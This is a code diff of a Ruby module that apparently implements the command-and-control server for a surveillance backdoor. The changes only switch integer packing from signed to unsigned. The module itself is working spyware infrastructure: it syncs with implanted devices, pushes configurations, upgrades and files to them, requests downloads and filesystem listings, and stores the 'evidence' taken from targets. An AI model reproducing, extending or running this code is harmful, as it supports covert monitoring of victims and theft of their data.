@@ -48,7 +48,7 @@ module Commands
   def command_id(peer, session, message)
 
     # backdoor version
-    version = message.slice!(0..3).unpack('i').first
+    version = message.slice!(0..3).unpack('I').first
 
     # ident of the target
     user_id, device_id, source_id = message.unpascalize_ary
@@ -65,33 +65,33 @@ module Commands
     EvidenceManager.instance.sync_start session, version, user_id, device_id, source_id, now
 
     # response to the request
-    command = [PROTO_OK].pack('i')
+    command = [PROTO_OK].pack('I')
 
     # the time of the server to synchronize the clocks
-    time = [now.to_i].pack('q')
+    time = [now.to_i].pack('Q')
 
     available = ""
     # ask to the db if there are any availables for the backdoor
     # the results are actually downloaded and saved locally
     # we will retrieve the content when the backdoor ask for them later
     if DB.instance.new_conf? session[:bid] then
-      available += [PROTO_CONF].pack('i')
+      available += [PROTO_CONF].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New config"
     end
     if DB.instance.new_upgrade? session[:bid]
-      available += [PROTO_UPGRADE].pack('i')
+      available += [PROTO_UPGRADE].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New upgrade"
     end
     if DB.instance.new_downloads? session[:bid] then
-      available += [PROTO_DOWNLOAD].pack('i')
+      available += [PROTO_DOWNLOAD].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New downloads"
     end
     if DB.instance.new_uploads? session[:bid] then
-      available += [PROTO_UPLOAD].pack('i')
+      available += [PROTO_UPLOAD].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New uploads"
     end
     if DB.instance.new_filesystems? session[:bid]
-      available += [PROTO_FILESYSTEM].pack('i')
+      available += [PROTO_FILESYSTEM].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New filesystems"
     end
 
@@ -99,7 +99,7 @@ module Commands
     tot = time.length + 4 + available.length
 
     # prepare the response
-    response = command + [tot].pack('i') + time + [available.length / 4].pack('i') + available
+    response = command + [tot].pack('I') + time + [available.length / 4].pack('I') + available
 
     return response
   end
@@ -117,7 +117,7 @@ module Commands
 
     trace :info, "[#{peer}][#{session[:cookie]}] Synchronization completed"
 
-    return [PROTO_OK].pack('i') + [0].pack('i')
+    return [PROTO_OK].pack('I') + [0].pack('I')
   end
 
   # Protocol Conf
@@ -133,10 +133,10 @@ module Commands
     # send the response
     if conf.nil? then
       trace :info, "[#{peer}][#{session[:cookie]}] NO new configuration"
-      response = [PROTO_NO].pack('i')
+      response = [PROTO_NO].pack('I')
     else
       trace :info, "[#{peer}][#{session[:cookie]}] New configuration (#{conf.length} bytes)"
-      response = [PROTO_OK].pack('i') + [conf.length].pack('i') + conf
+      response = [PROTO_OK].pack('I') + [conf.length].pack('I') + conf
     end
 
     return response
@@ -157,16 +157,16 @@ module Commands
     # send the response
     if upload.nil? then
       trace :info, "[#{peer}][#{session[:cookie]}] NO uploads"
-      response = [PROTO_NO].pack('i')
+      response = [PROTO_NO].pack('I')
     else
-      response = [PROTO_OK].pack('i')
+      response = [PROTO_OK].pack('I')
 
-      content = [left].pack('i')                     # number of uploads still waiting in the db
+      content = [left].pack('I')                     # number of uploads still waiting in the db
       content += upload[:filename].pascalize         # filename
-      content += [upload[:content].length].pack('i') # file size
+      content += [upload[:content].length].pack('I') # file size
       content += upload[:content]                    # file content
 
-      response += [content.length].pack('i') + content
+      response += [content.length].pack('I') + content
 
       trace :info, "[#{peer}][#{session[:cookie]}] [#{upload[:filename]}][#{upload[:content].length}] sent (#{left} left)"
     end
@@ -186,16 +186,16 @@ module Commands
     # send the response
     if upgrade.nil? then
       trace :info, "[#{peer}][#{session[:cookie]}] NO upgrade"
-      response = [PROTO_NO].pack('i')
+      response = [PROTO_NO].pack('I')
     else
-      response = [PROTO_OK].pack('i')
+      response = [PROTO_OK].pack('I')
 
-      content = [left].pack('i')                      # number of upgrades still waiting in the db
+      content = [left].pack('I')                      # number of upgrades still waiting in the db
       content += upgrade[:filename].pascalize         # filename
-      content += [upgrade[:content].length].pack('i') # file size
+      content += [upgrade[:content].length].pack('I') # file size
       content += upgrade[:content]                    # file content
 
-      response += [content.length].pack('i') + content
+      response += [content.length].pack('I') + content
 
       trace :info, "[#{peer}][#{session[:cookie]}] [#{upgrade[:filename]}][#{upgrade[:content].length}] sent (#{left} left)"
     end
@@ -216,16 +216,16 @@ module Commands
     # send the response
     if downloads.empty? then
       trace :info, "[#{peer}][#{session[:cookie]}] NO downloads"
-      response = [PROTO_NO].pack('i')
+      response = [PROTO_NO].pack('I')
     else
-      response = [PROTO_OK].pack('i')
+      response = [PROTO_OK].pack('I')
       list = ""
       # create the list of patterns to download
       downloads.each do |dow|
         trace :info, "[#{peer}][#{session[:cookie]}] #{dow}"
         list += dow.pascalize
       end
-      response += [list.length + 4].pack('i') + [downloads.size].pack('i') + list
+      response += [list.length + 4].pack('I') + [downloads.size].pack('I') + list
       trace :info, "[#{peer}][#{session[:cookie]}] #{downloads.size} download requests sent"
     end
 
@@ -245,16 +245,16 @@ module Commands
     # send the response
     if filesystems.empty? then
       trace :info, "[#{peer}][#{session[:cookie]}] NO filesystem"
-      response = [PROTO_NO].pack('i')
+      response = [PROTO_NO].pack('I')
     else
-      response = [PROTO_OK].pack('i')
+      response = [PROTO_OK].pack('I')
       list = ""
       # create the list of patterns to download
       filesystems.each do |fs|
         trace :info, "[#{peer}][#{session[:cookie]}] #{fs[:depth]} #{fs[:path]}"
-        list += [fs[:depth]].pack('i') + fs[:path].pascalize
+        list += [fs[:depth]].pack('I') + fs[:path].pascalize
       end
-      response += [list.length + 4].pack('i') + [filesystems.size].pack('i') + list
+      response += [list.length + 4].pack('I') + [filesystems.size].pack('I') + list
       trace :info, "[#{peer}][#{session[:cookie]}] #{filesystems.size} filesystem requests sent"
     end
 
@@ -267,7 +267,7 @@ module Commands
   def command_evidence(peer, session, message)
 
     # get the file size
-    size = message.slice!(0..3).unpack('i').first
+    size = message.slice!(0..3).unpack('I').first
 
     # send the evidence to the db
     begin
@@ -275,10 +275,10 @@ module Commands
       trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes)"
     rescue Exception => e
       trace :warn, "[#{peer}][#{session[:cookie]}] Evidence NOT saved: #{e.message}"
-      return [PROTO_NO].pack('i')
+      return [PROTO_NO].pack('I')
     end
 
-    return [PROTO_OK].pack('i') + [0].pack('i')
+    return [PROTO_OK].pack('I') + [0].pack('I')
   end
 
 end #Commands
